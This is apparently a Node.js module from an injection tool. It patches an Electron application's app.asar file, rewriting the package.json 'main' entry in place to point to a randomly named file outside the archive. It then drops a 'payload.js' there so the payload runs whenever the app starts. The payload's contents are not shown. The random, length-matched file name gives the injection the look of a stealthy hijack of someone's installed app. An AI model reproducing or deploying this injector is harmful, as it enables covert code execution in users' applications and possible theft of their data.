import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';
import logger from './logger.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function readAsarHeader(asarPath) {
    const fd = await fs.open(asarPath, 'r');
    const headerBuf = Buffer.alloc(16);
    await fd.read(headerBuf, 0, 16, 0);

    const pickleSize = headerBuf.readUInt32LE(12);
    const jsonBuf = Buffer.alloc(pickleSize);
    await fd.read(jsonBuf, 0, pickleSize, 16);

    const jsonStr = jsonBuf.toString('utf8');
    const jsonStart = jsonStr.indexOf('{');
    const headerJson = JSON.parse(jsonStr.slice(jsonStart));

    const headerSize = 16 + pickleSize;
    const dataOffset = headerSize % 4 === 0 ? headerSize : headerSize + (4 - headerSize % 4);

    await fd.close();

    return { header: headerJson, dataOffset };
}

async function extractFile(asarPath, filePath, header, dataOffset) {
    const parts = filePath.split('/');
    let current = header.files;

    for (const part of parts) {
        if (!current[part]) {
            throw new Error(`File not found: ${filePath}`);
        }
        current = current[part];
    }

    if (!current.size || current.offset === undefined) {
        throw new Error(`Not a file: ${filePath}`);
    }

    const fd = await fs.open(asarPath, 'r');
    const fileOffset = dataOffset + parseInt(current.offset);
    const fileSize = current.size;

    const fileBuf = Buffer.alloc(fileSize);
    await fd.read(fileBuf, 0, fileSize, fileOffset);
    await fd.close();

    return fileBuf;
}

async function createBackup(asarPath) {
    const backupPath = asarPath + '.bak';
    try {
        await fs.access(backupPath);
        logger.notify(`[i] Backup already exists at ${backupPath}, skipping...`);
    } catch {
        await fs.copyFile(asarPath, backupPath);
        logger.success(`[+] Created fresh backup: ${path.basename(backupPath)}`);
    }
}

function randomString(length) {
    let result = '';
    while (result.length < length) {
        result += Math.random().toString(36).substring(2);
    }
    return result.substring(0, length);
}

async function patch(resourcesPath)
{
    try {
        const asarPath = path.join(resourcesPath, 'app.asar');

        logger.notify('\n[i] Adding payload...');
        const { header, dataOffset } = await readAsarHeader(asarPath);

     //   console.log('Header parsed');
    //    console.log('Data starts at offset:', dataOffset);

    //    console.log('\nExtracting package.json...');
        const packageJsonBuf = await extractFile(asarPath, 'package.json', header, dataOffset);
        const packageJson = JSON.parse(packageJsonBuf.toString('utf8'));

    //    console.log('\nKey info:');
        logger.notify('  Name: '+ packageJson.name);
        logger.notify('  Version: '+ packageJson.version);
        logger.notify('  Main entry: '+ packageJson.main);

        if (packageJson.main.startsWith('../')) 
        {
            logger.notify('\n[i] Payload already installed.');
            return;
        }

      /*  if (header.files['package.json']) {
            console.log('\nFile info:');
            console.log('  Offset:', header.files['package.json'].offset);
            console.log('  Size:', header.files['package.json'].size);
            console.log('  Absolute position:', dataOffset + parseInt(header.files['package.json'].offset));
        }*/

        const targetLength = packageJson.main.length;
        const prefixSuffix = 6;
        const randomLength = targetLength - prefixSuffix;
        const randomMain = randomString(randomLength);
        const newMainFileName = `${randomMain}.js`;
        const newMain = `../${newMainFileName}`;

        packageJson.main = newMain;

        const newPackageJsonStr = JSON.stringify(packageJson, null, 2);
        const newPackageJsonBuf = Buffer.from(newPackageJsonStr, 'utf8');

        if (newPackageJsonBuf.length !== packageJsonBuf.length) {
            throw new Error(`Size mismatch! Old: ${packageJsonBuf.length}, New: ${newPackageJsonBuf.length}`);
        }

        await createBackup(asarPath);
        logger.notify('\n[i] Backup created.');


        const fd = await fs.open(asarPath, 'r+'); 
        
        const oldMainPath = packageJsonBuf.toString('utf8').match(/"main"\s*:\s*"([^"]+)"/)[1];
        const oldMainEntry = `"main": "${oldMainPath}"`;
        
        let newMainEntry = `"main": "../${newMainFileName}"`;
        
        if (newMainEntry.length > oldMainEntry.length) {
            throw new Error("New path is too long! It must be shorter or equal to the original path.");
        }

        while (newMainEntry.length < oldMainEntry.length) {
            newMainEntry += " "; 
        }

        const fullAsarBuffer = await fs.readFile(asarPath);
        const patchOffset = fullAsarBuffer.indexOf(Buffer.from(oldMainEntry));

        if (patchOffset === -1) {
            await fd.close();
            throw new Error("Could not find the 'main' entry string in the ASAR binary.");
        }

       // console.log(`\nPatching at offset: ${patchOffset}`);
        //console.log(`Original: ${oldMainEntry}`);
        //console.log(`Target:   ${newMainEntry}`);

        await fd.write(Buffer.from(newMainEntry), 0, newMainEntry.length, patchOffset);
        await fd.close();

        const payloadPath = path.join(__dirname, "template", 'payload.js');
        //console.log('\nReading payload...');
        const payloadBuf = await fs.readFile(payloadPath);

        const newPayloadPath = path.join(resourcesPath, newMainFileName);
        //console.log('Payload target:', newPayloadPath);

        try {
            await fs.writeFile(newPayloadPath, payloadBuf);
            //console.log('Payload created:', newPayloadPath);
            //console.log('Size:', payloadBuf.length, 'bytes');
            
            const stats = await fs.stat(newPayloadPath);
            //console.log('Verify stats:', stats.size, 'bytes');
        } catch (writeErr) {
            console.error('Write failed:', writeErr.message);
            process.exit(1);
        }

        logger.success('[+] bridge applied successfully.');

    } catch (error) {
        console.error('Error:', error.message);
        console.error(error.stack);
        process.exit(1);
    }
}

export default {
    patch
}